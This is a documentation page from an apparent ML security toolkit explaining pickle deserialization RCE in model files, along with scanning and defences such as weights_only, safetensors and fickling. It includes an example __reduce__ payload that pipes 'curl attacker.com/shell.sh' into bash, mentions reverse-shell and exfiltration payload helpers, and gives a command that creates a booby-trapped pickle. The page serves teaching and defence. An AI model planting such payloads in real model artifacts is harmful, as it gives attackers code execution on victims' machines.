# Pickle Deserialization RCE

> **In one sentence:** ML model files are pickles, and unpickling runs code, so a booby-trapped `.pt` or `.pkl` file executes an attacker's payload the moment someone loads it, no training or inference required.

## What it is

Python's `pickle` is a serialization format that can encode *how to reconstruct an object*, including calling arbitrary functions. `pickle.loads()` executes those reconstruction instructions blindly. Almost every ML artifact is pickle-based: `.pkl`, `.pt`, `.pth`, and `.joblib` all round-trip through pickle. So loading an untrusted model is equivalent to running untrusted code.

This is not a data-poisoning attack in the learning sense; it is a **supply-chain** attack on the model artifact. The model never has to be good, or even valid. It just has to be loaded.

```python
class MaliciousModel:
    def __reduce__(self):
        return (os.system, ("curl attacker.com/shell.sh | bash",))

# Anyone who does torch.load("model.pt") runs the payload
```

## The problem it exploits

`pickle` lets a class define `__reduce__`, which returns a callable and its arguments. During unpickling, `pickle` calls that callable to rebuild the object, no questions asked. There is no sandbox, no allowlist, no validation by default. The Python docs say it plainly: "The pickle module is not secure. Only unpickle data you trust." ML tooling built `torch.load()`, `joblib.load()`, and friends on top of pickle, and the community routinely downloads models from public hubs, so the trust assumption is violated constantly.

## Intuition

A pickle file is not data, it is a tiny program that says "to rebuild me, run these steps." Normally the steps are boring ("make a tensor, fill it with these numbers"). But nothing stops the steps from being "run this shell command." Loading the file *is* running the program. Treating a downloaded `.pt` as inert data is like treating a downloaded `.exe` as a text file and double-clicking it.

## How it works

The offensive side (the toolkit's `pickle_exploit.py` in `create` mode):

1. Define a class with a malicious `__reduce__` that returns `(os.system, (cmd,))` or `(exec, (python_code,))`.
2. Optionally wrap it around real-looking model data (`model_state_dict`, `epoch`, `loss`) for cover, so the file still resembles a checkpoint.
3. Save it with `torch.save()` or `pickle.dump()`. The payload is now baked into the file.
4. When the victim calls `torch.load(path)` (with `weights_only=False`, the old default), `__reduce__` fires and the payload runs with the victim's privileges.

The toolkit ships example payloads: a reverse shell (`create_reverse_shell_model`, connects back to host:port and spawns `/bin/sh`) and a data-exfiltration stub (`create_data_exfil_model`, POSTs hostname, user, cwd, and a file listing to a URL).

The defensive side (`scan` mode) disassembles the pickle with `pickletools` and flags:

- Dangerous **opcodes** that enable code execution: `GLOBAL`, `INST`, `REDUCE`, `BUILD`.
- Dangerous **module and function names** in the raw bytes: `os`, `subprocess`, `socket`, `system`, `exec`, `eval`, `urlopen`, and so on.
- Every `GLOBAL` import line, so you can see exactly what the file wants to pull in.

For PyTorch files (which are zip archives containing `data.pkl`), the scanner unzips and inspects the internal pickle.

## Threat model and prerequisites

- **Delivery:** the attacker must get the victim to load a file they control. Vectors include a public model hub, a shared registry, a compromised storage bucket with write access, or a supply-chain dependency that ships a checkpoint.
- **Trigger:** the victim loads it with a pickle-based loader without `weights_only=True`. That single call is the whole exploit.
- **Privileges:** the payload runs as whoever loaded the model, often a training node, a CI runner, or an inference server. That is frequently high-value infrastructure.

## When to use it

- You have (or can plant) a model in a store the target will load from, and you want code execution rather than just a bad prediction.
- You are red-teaming an MLOps pipeline and want to prove that "load the latest model" equals "run arbitrary code."
- You want to demonstrate why `weights_only=True`, `safetensors`, and artifact signing are mandatory.

## Step by step with the toolkit

Create a malicious pickle that runs a command, then scan it:

```
python -m data_poisoning.pickle_exploit --mode create --file evil.pkl --command "id"
```

Scan an untrusted model file before loading it:

```
python -m data_poisoning.pickle_exploit --mode scan --file suspicious_model.pt
```

Available flags (read `data_poisoning/pickle_exploit.py`):

- `--mode {create,scan,stegano}` (default `scan`)
- `--file` path to the model file (default `model.pt`)
- `--command` the shell command embedded by `create` mode (default `id`)

In `create` mode the script writes the payload and immediately scans it so you can see the flagged opcodes. In `scan` mode it reports suspicious modules, functions, and the dangerous opcode counts.

### Scanning with fickling

`pickletools` disassembly (what the toolkit uses) is a solid first pass. For production use, reach for **fickling**, Trail of Bits' dedicated pickle security tool:

```
pip install fickling
fickling --check-safety suspicious_model.pt      # verdict on whether it is safe to load
fickling suspicious_model.pt                       # decompiled, human-readable pickle program
```

Fickling parses the pickle into an abstract syntax tree, reasons about what it would execute, and can flag or even rewrite malicious files. Prefer it over string matching, which produces false positives (a legitimate model can mention `os` in a docstring) and false negatives (payloads can be obfuscated).

## Detection and defense

- **`torch.load(path, weights_only=True)`** restricts loading to plain tensors and basic types, blocking `__reduce__` execution. This is the default in recent PyTorch; do not override it for untrusted files.
- **Use `safetensors`** instead of pickle. It stores only tensors in a simple, code-free format, so there is nothing to execute.
- **Scan before loading** with fickling (or the toolkit scanner) as a CI gate on every incoming model.
- **Sign and verify** model artifacts (hash or signature) so tampering is detectable.
- **Sandbox model loading** (containers, seccomp, no network, least privilege) so even a fired payload is contained.
- **Vet sources:** treat models from public hubs as untrusted binaries.

## Explain it to a non-expert

You would never open a stranger's `.exe` and click "run." A machine learning model file feels harmless, like a spreadsheet of numbers, so people load them from the internet without a second thought. But these files are secretly little instruction lists that the computer follows the moment you open them, and one of those instructions can be "give the sender a remote control of this machine." The safe habit is the same as with any download: only run it if you trust where it came from, and use the loader setting that reads the numbers without following any embedded instructions.

## References

- Trail of Bits (2021), *Never a Dill Moment: Exploiting Machine Learning Pickle Files*
- fickling: https://github.com/trailofbits/fickling
- Python docs, `pickle`: "The pickle module is not secure. Only unpickle data you trust."
- Hugging Face safetensors: https://github.com/huggingface/safetensors
- See also: [overview](00-overview.md), [tensor steganography](tensor-steganography.md)
